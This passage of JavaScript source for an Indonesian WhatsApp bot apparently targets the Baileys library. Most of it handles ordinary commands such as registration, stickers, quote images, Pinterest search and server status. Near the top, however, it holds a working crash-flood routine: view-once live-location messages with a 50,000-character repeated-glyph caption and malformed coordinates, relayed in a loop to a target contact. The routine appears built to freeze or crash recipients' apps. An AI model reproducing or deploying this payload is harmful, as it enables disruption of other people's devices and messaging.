    'messageId': messageContent.key.id
  });
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await RezzHost.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

//==================[ BATAS AWAL FEATURE ]===============\\
switch (command) {
// M A I N - M E N U

case 'public': {
if (!isCreator) return reply2(mess.owner) 
RezzHost.public = true
reply('*_SUKSES PUBLIC MODE_*')
}
break
case 'self': {
if (!isCreator) return reply2(mess.owner) 
RezzHost.public = false
reply('*_SUKSES SELF MODE_*')
}
break    
case 'hitday': {
if (!isRegistered) return reply2(mess.regis)
reply(Styles(`Total Hits: *${settings.hitstat}*`))
}
break
case 'buyprem': {
if (!isRegistered) return reply2(mess.regis)
try {
let now = new Date * 1
         let package = [{
            _id: '1D',
            name: 'PREMIUM 1 DAY',
            price: 100_000,
            limit: 30,
            duration: 86400000 * 1
         }, {
            _id: '3D',
            name: 'PREMIUM 3 DAY',
            price: 300_000,
            limit: 100,
            duration: 86400000 * 3
         }, {
            _id: '7D',
            name: 'PREMIUM 7 DAY',
            price: 700_000,
            limit: 250,
            duration: 86400000 * 7
         }, {
            _id: '30D',
            name: 'PREMIUM 30 DAY',
            price: 1_000_000,
            limit: 1000,
            duration: 86400000 * 30
         }]
         let p = `乂  *B U Y P R E M*\n\n`
         package.map((v, i) => {
            p += `${(i+1)}. ${v.name}\n`
            p += `◦  *Price* : ${Func.formatter(v.price)} Points\n`
            p += `◦  *Command* : ${prefix + command} ${v._id}\n\n`
         })
         p += global.footer
         if (!args || !args[0]) return RezzHost.sendMessage(m.chat, {
text: wm,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: wm,
body: '',
thumbnailUrl: "https://telegra.ph/file/3b37ed9bb6255555197c4.jpg",
sourceUrl: gr,
mediaType: 1,
renderLargerThumbnail: true
}}
})
const pkg = package.find(v => v._id == (args[0]).toUpperCase())
if (!pkg) return reply(`🚩 Package not found.`)
if (Number(pkg.price) > users.balance) return reply(`🚩 Your points are not enough to be exchanged for a ${pkg.name} package.`)
users.limit += pkg.limit
users.expired += users.premium ? (pkg.duration) : (now + pkg.duration)
users.balance -= Number(pkg.price)
reply(`✅ Succesfully buying ${pkg.name} package.`).then(() => users.premium = true)
} catch (e) {
m.reply(Func.jsonFormat(e))
}
}
break    
case 'claim': 
case 'mulung':
case 'maling': {
if (!isRegistered) return reply2(mess.regis)
let timeClaim = 3600000
let claimed = new Date(users.lastclaim + timeClaim)
let timeout = claimed - new Date()
let balance = Func.randomInt(1, 5000)
if (new Date - users.lastclaim >= timeClaim) {
reply(`🎉 Congratulations!, you got +${Func.formatNumber(balance)} points.`)
users.balance += balance
users.lastclaim = new Date() * 1
} else {
reply(`*You have claimed, you can reclaim in the next hour.*\n\n*Timeout : [ ${Func.toTime(timeout)} ]*`)
}
}
break
case 'tes': {
m.reply('Bot Online!');
}
break
case 'assalamualaikum':
case 'assalamu alaikum': {
m.reply('Waalaikum Salam');
}
break
case 'cekvps':{
if (!isCreator) return reply2(mess.owner) 
exec('neofetch --stdout', (err, data) => {
if (err) {
console.log(err.message)
reply(`Eror : ${err.message}`);
} else {
reply(`${data}`);
}
});
}
break
case 'disk': 
case 'rom': {
if (!isCreator) return reply2(mess.owner) 
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `
───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ Nomor : ${m.sender.split('@')[0]}
○ Nama : ${pushname}
○ Status : Sukses✅ 
○ Ns : ${serialUser}
`
users.registered = true
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: wm, 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: mzd
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `U S E R  R E G I S T E R`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1990c2d9c2a8436eca55b.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📲 MENU\",\"id\":\".menu\"}`
 },{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 MY OWNER","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP ","url":"${gr}","merchant_url":"https://www.google.com"}`
}
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'autodlchange':{
if (!isCreator) return reply('Fitur Khusus owner !')
if (args[0] === "on") {
if (isAutoDlGc) return reply(`activated`)
chats.autodl = true
reply('Successfully Activate Auto Downloader')
} else if (args[0] === "off") {
if (!isAutoDlGc) return reply(`it's deactivated`)
chats.autodl = false
reply('Successfully Disabling Auto Downloader')
} else {
reply(`${prefix+command} enable -- _mengaktifkan_\n${prefix+command} disable -- _Menonaktifkan_`)
}}
break
case 'autodl': 
case 'autodonload': {
if (!isCreator) return m.reply(mess.owner);
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/7297aef280592b9fdaad0.jpg"
let img2 = "https://telegra.ph/file/d2d977d9d6b51f67009c5.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*${command}*\n*Untuk ${botname}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `
Haii kak ${pushname}\n${stime}\n\n
> *KETIK UNTUK MENGAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"✅ ${command} On\",\"id\":\".autodlchange on\"}`
}
],},},
{
header: {
imageMessage: await image(img2),
hasMediaAttachment: true,
},
body: { text: `
Haii kak ${pushname}\n${stime}\n\n
> *KETIK UNTUK MENONAKTIFKAN ${command} DI ${botname}*
` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"❌ ${command} Off\",\"id\":\".autodlchange off\"}`
}
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break

case 'editmsg': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
if (!text) throw `[ ! ] masukkan teks`
if (!m.quoted) return false
let { fromMe, isBaileys } = m.quoted
await RezzHost.sendMessage(m.chat, { text: text, edit: m.quoted, fromMe: true })
}
break
case 'server': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
    const response = await axios.get('http://ip-api.com/json/');
    const serverInfo = response.data;

    let serverMessage = `*S E R V E R - I N F O*\n\n`;
    const osInfo = Styles(os.platform(), 1);
    const totalRAM = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(1); // in GB
    const freeRAM = (os.freemem() / (1024 * 1024 * 1024)).toFixed(1); // in GB
    const uptime = os.uptime();
    const uptimeFormatted = formatUptime(uptime);
    const processor = Styles(os.cpus()[0].model, 1);
    const totalCores = os.cpus().length;

    serverMessage += `┌  ◦  *OS :* ${osInfo}\n`;
    serverMessage += `│  ◦  *RAM :* ${freeRAM} GB / ${totalRAM} GB\n`;
    serverMessage += `│  ◦  *Country :* ${serverInfo.country}\n`;
    serverMessage += `│  ◦  *CountryCode :* ${serverInfo.countryCode}\n`;
    serverMessage += `│  ◦  *Region :* ${serverInfo.region}\n`;
    serverMessage += `│  ◦  *RegionName :* ${serverInfo.regionName}\n`;
    serverMessage += `│  ◦  *City :* ${serverInfo.city}\n`;
    serverMessage += `│  ◦  *Zip :* ${serverInfo.zip}\n`;
    serverMessage += `│  ◦  *Lat :* ${serverInfo.lat}\n`;
    serverMessage += `│  ◦  *Lon :* ${serverInfo.lon}\n`;
    serverMessage += `│  ◦  *Timezone :* ${serverInfo.timezone}\n`;
    serverMessage += `│  ◦  *Isp :* ${serverInfo.isp}\n`;
    serverMessage += `│  ◦  *Org :* ${serverInfo.org}\n`;
    serverMessage += `│  ◦  *As :* ${serverInfo.as}\n`;
    serverMessage += `│  ◦  *Query :* ${serverInfo.query}\n`;
    serverMessage += `│  ◦  *Uptime :* ${uptimeFormatted}\n`;
    serverMessage += `└  ◦  *Processor :* ${processor} (${totalCores} Cores)`;
RezzHost.sendMessage(m.chat, {
text: serverMessage,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 S E R V E R - I N F O`,
body: '',
thumbnailUrl: 'https://telegra.ph/file/c0a1e579a7f491bce67bc.jpg',
sourceUrl: gr,
mediaType: 1,
renderLargerThumbnail: true
}}
})
  }
break
case 'btc': case 'botcomment': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('Example: Haloo!')
reply(mess.search)
RezzHost.sendMessage(m.chat, { image: { url: `https://pitucode.com/creator/botcomment?text=${q}&apikey=${pitu}` }, caption: `Image Bot Comment\nCreated By ${ownername}` }, {quoted: kalgans})
	    	}
	    	break
case 'ytc': case 'ytcomment': {
if (!isRegistered) return reply2(mess.regis)
if (!text) return reply(`Cara penggunaan:\n${prefix + command} [Username]|[Comment]\n\nContoh:\n${prefix + command} Hyuu|Halo, Mau Buy Script?`)
let [Username, Comment] = text.split("|")
if (!Username) return reply(`Masukkan nama akun`)
if (!Comment) return reply(`Masukkan comment`)
reply(mess.search)
RezzHost.sendMessage(m.chat, { image: { url: `https://pitucode.com/creator/ytcomment?url=https://i.ibb.co/9Vz4t6Y/766cf68698c15e78a5bff139a213bff1.jpg&text=${Comment}&text2=${Username}&apikey=${pitu}` }, caption: `Created By ${ownername}\nType: ${command}`}, { quoted: kalgans })
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!isRegistered) return reply2(mess.regis)
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await RezzHost.sendImageAsStickerAV(from, media, kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply2('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await RezzHost.sendVideoAsSticker(from, media, kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 's-avatar': {
if (!isRegistered) return reply2(mess.regis)
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await RezzHost.sendImageAsStickerAvatar(from, media, kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await RezzHost.sendImageAsStickerAvatar(from, media, kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'creator': 
case 'owner': case 'crator': case 'developer':{
if (isBan) return reply(mess.banned)
const kontak = {
"displayName": 'My Owner',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: INI OWNER\nEND:VCARD`
}
await RezzHost.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`MY OWNER REZZ BOTZZ`), 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./media/quoted.jpg"),
"mediaUrl": `https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r`,
"sourceUrl": `https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r`
}}}, { quoted: kalgans })
}
break
case 'qc2': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await RezzHost.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
RezzHost.sendImageAsSticker(m.chat, buffer, kalgans, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'qc': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await RezzHost.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
RezzHost.sendImageAsSticker(m.chat, buffer, kalgans, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'pin': case 'pinterest': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :* ${prefix+command} Tobrut`)
  await m.reply(mess.wait);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: RezzHost.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10);
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `HASIL PENCARIAN ${text}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Hasil Pencarian ${botname}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"GC OWNER","url":"${gr}","merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"SOURCE","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'HASIL PENCARIAN REZZ BOTZ'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await RezzHost.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

case 'botstatus': case 'statusbot': case 'ping': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
    last.total += cpu.total
    last.speed += cpu.speed / length
    last.times.user += cpu.times.user
    last.times.nice += cpu.times.nice
    last.times.sys += cpu.times.sys
    last.times.idle += cpu.times.idle
    last.times.irq += cpu.times.irq
    return last
}, {
    speed: 0,
    total: 0,
    times: {
	user: 0,
	nice: 0,
	sys: 0,
	idle: 0,
	irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(Styles(respon))
}
break
case 'darkjoke': case 'darkjokes': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
var ress = await Darkjokes()
let old = new Date()

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`${hiasan}*Fetching* : ${((new Date - old) * 1)} ms`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*Random DarkJokes*`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: ress } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".darkjoke\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'meme': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
reply2(mess.search)
RezzHost.sendMessage(m.chat, { image: { url: `https://pitucode.com/randomimage/meme?apikey=${pitu}`}, caption: mess.done }, {quoted: kalgans})
}
break
case 'stickmeme': {
if (!isCreator) return reply2(mess.owner) 
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  try {
  let mee = await RezzHost.downloadAndSaveMediaMessage(quoted)
  let mem = await uptotelegra(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await RezzHost.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
case 'smeme':
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
await loading()
 if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
reply2(mess.wait)
mee = await RezzHost.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
RezzHost.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
case 'block': {
if (!isCreator) return reply2(mess.owner)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.updateBlockStatus(users, 'block').then((res) => reply2(jsonformat(res))).catch((err) => reply2(jsonformat(err)))
}
break
case 'unblock': {
if (!isCreator) return reply2(mess.owner)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.updateBlockStatus(users, 'unblock').then((res) => reply2(jsonformat(res))).catch((err) => reply2(jsonformat(err)))
}
break
case 'rate': {
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'del': case 'd': case 'delete': case 'dellete': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (!m.quoted) return false
let { chat, fromMe, id, isBaileys } = m.quoted
RezzHost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'textblank':
if (!isCreator) return reply(mess.owner)
reply(`ㅤ`)
break
case 'restart':
if (!isCreator) return reply2(mess.owner) 
reply(`_Restarting ${botname} Setelah ${runtime(process.uptime())} . . ._`)
await sleep(3000)
process.exit()
break
case 'runtime':
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'bagi':
if (isBan) return reply2(mess.ban)
if (!isRegistered) return reply2(mess.regis)
if (args.length < 1) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`${nilai_one / nilai_two}`)
break
case 'listmodapk':
if (!isCreator) return reply(mess.owner)
await loading()
